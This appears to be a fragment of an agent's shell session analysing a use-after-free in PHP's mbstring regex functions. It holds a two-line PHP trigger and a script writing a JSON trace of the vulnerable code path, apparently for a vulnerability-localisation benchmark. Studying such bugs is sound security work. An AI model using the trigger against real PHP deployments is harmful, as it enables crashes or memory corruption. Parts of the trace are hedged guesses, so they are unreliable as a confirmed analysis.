mb_ereg_search_init('a', 'a');

mb_ereg_search_pos();

python3 - <<'PY'
import json
trace=[
{"step":1,"file":"src-vul/php-src/ext/mbstring/php_mbregex.c","function":"PHP_FUNCTION(mb_ereg_search_init)","line":1410,"var":"pattern","code":"MBREX(search_re) = php_mbregex_compile_pattern(arg_pattern, arg_pattern_len, option, MBREX(current_mbctype), syntax);","note":"The attacker-controlled pattern is compiled and installed as the current search regex."},
{"step":2,"file":"src-vul/php-src/ext/mbstring/php_mbregex.c","function":"php_mbregex_compile_pattern","line":470,"var":"MBREX(search_re)","code":"if (rc == MBREX(search_re)) { /* reuse the new rc? see bug #72399 */ MBREX(search_re) = NULL; }","note":"Recompiling the same pattern can detach the global search_re pointer from the cached regex object, leaving later lookups inconsistent."},
{"step":3,"file":"src-vul/php-src/ext/mbstring/php_mbregex.c","function":"PHP_FUNCTION(mb_ereg_search_init)","line":1540,"var":"MBREX(search_str)","code":"ZVAL_STR_COPY(&MBREX(search_str), arg_str);","note":"The subject string is retained across calls, so the search state persists into the next API invocation."},
{"step":4,"file":"src-vul/php-src/ext/mbstring/php_mbregex.c","function":"_php_mb_regex_ereg_search_exec","line":1423,"var":"MBREX(search_re)","code":"if (MBREX(search_re) == NULL) { php_error_docref(NULL, E_WARNING, \"No regex given\"); RETURN_FALSE; }","note":"If the search_re pointer was nulled by cache reuse, the later search path dereferences a stale module-global state machine."},
{"step":5,"file":"src-vul/php-src/ext/mbstring/php_mbregex.c","function":"_php_mb_regex_ereg_search_exec","line":1438,"var":"MBREX(search_re)","code":"err = _php_mb_onig_search(MBREX(search_re), str, str + len, str + pos, str + len, MBREX(search_regs), 0);","note":"The search engine is invoked with the module-global regex pointer that may now be stale or freed, which is the expected sink for the UAF read."}
]
open('/workspace/candidate_trace.json','w').write(json.dumps(trace,separators=(',',':')))
PY
php -d detect_unicode=0 -r 'echo "ready\n";' >/dev/null 2>&1 || true
cat /workspace/poc.php && echo '---' && cat /workspace/candidate_trace.json
